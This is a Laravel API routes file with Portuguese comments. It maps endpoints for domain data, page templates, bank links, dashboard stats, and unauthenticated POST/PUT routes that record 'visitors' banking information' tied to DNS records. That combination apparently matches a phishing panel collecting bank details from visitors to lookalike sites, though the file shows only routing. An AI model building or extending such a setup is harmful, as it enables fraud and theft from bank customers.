<?php

use App\Http\Controllers\ApiController;
use App\Http\Controllers\Api\VisitanteApiController;
use App\Http\Controllers\Api\PublicApiController;
use Illuminate\Support\Facades\Route;

// Rotas públicas que usam identificação por domínio ou token
Route::get('user/details', [ApiController::class, 'getUserDetails']);
Route::get('banks', [ApiController::class, 'getBanks']);

// API para visitantes associados a registros DNS
// Estas são as novas rotas que devem ser usadas em todos os novos desenvolvimentos
Route::post('dns-visitantes', [\App\Http\Controllers\Api\DnsVisitanteApiController::class, 'registrarVisitante']);
Route::post('dns-informacoes-bancarias', [\App\Http\Controllers\Api\DnsVisitanteApiController::class, 'registrarInformacaoBancaria']);
Route::put('dns-informacoes-bancarias', [\App\Http\Controllers\Api\DnsVisitanteApiController::class, 'atualizarInformacaoBancaria']);

// Rotas protegidas por API Key
Route::middleware('api_key')->group(function() {
    // Atualização de configurações
    Route::post('user/config', [ApiController::class, 'updateUserConfig']);
    Route::post('banks/links', [ApiController::class, 'updateBankLinks']);
});

// Rotas da API pública protegidas pelo middleware PublicApiAuthenticate
Route::prefix('public')->middleware(\App\Http\Middleware\PublicApiAuthenticate::class)->group(function () {
    // Rota para obter dados de um domínio/subdomínio específico
    Route::get('domain_external/{identifier}', [PublicApiController::class, 'getDomainData']);
    Route::get('domain/{identifier}', [PublicApiController::class, 'getDomainData']);
    // Rota para obter configuração de template
    Route::post('template/config', [PublicApiController::class, 'getTemplateConfig']);
});

// Rotas para o dashboard que requerem autenticação por token
Route::middleware('auth:sanctum')->prefix('dashboard')->group(function() {
    Route::get('stats', [ApiController::class, 'getDashboardStats']);
    Route::get('activity', [ApiController::class, 'getRecentActivity']);
});